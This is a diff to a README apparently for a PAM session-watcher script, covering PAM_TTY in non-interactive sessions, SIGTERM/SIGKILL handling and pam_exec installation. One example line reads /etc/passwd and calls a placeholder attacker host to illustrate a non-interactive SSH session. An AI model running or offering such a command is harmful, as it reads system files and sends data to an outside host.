@@ -15,29 +15,37 @@ Ansible
 Use a dedicated ansible user.
 
 
-Caveats
--------
+Processes
+---------
+
+**PAM_TTY** will be blank or completely unassigned during non-interactive automated actions that trigger a PAM session but don't allocate a terminal interface.
 
 ```sh
 ssh user@server "cat /etc/passwd && curl http://attacker.com/leak"
 # There is no interactive shell to log out of. The SSH daemon spawns the process directly, executes the string, and closes.
 ```
 
+Signals
+-------
+
 **SIGHUP** or **SIGTERM** may be trapped and ignored.
+
 **SIGKILL** is the only signal in Linux that cannot be caught, blocked, or ignored by a process. 
 The moment the kernel sees a kill -9, it doesn't ask the process to close - it immediately wipes the process out of system memory.
+This brings the risk of data corruption.
 
-But it brings the risk of data corruption.
+Therefore the script tries to terminate the processes with **SIGTERM** first.
+After a small period **SIGKILL** is used to kill the remaining ones.
 
 ```sh
 trap "echo I am not leaving" SIGHUP SIGTERM
 ```
 
-Install
--------
+INSTALL
+=======
 
 ```sh
 # /etc/pam.d/common-session
 # at the bottom:
-session optional pam_exec.so /usr/local/bin/pam_sentinel.sh
+session optional pam_exec.so PATH_TO_YOUR_SCRIPT
 ```
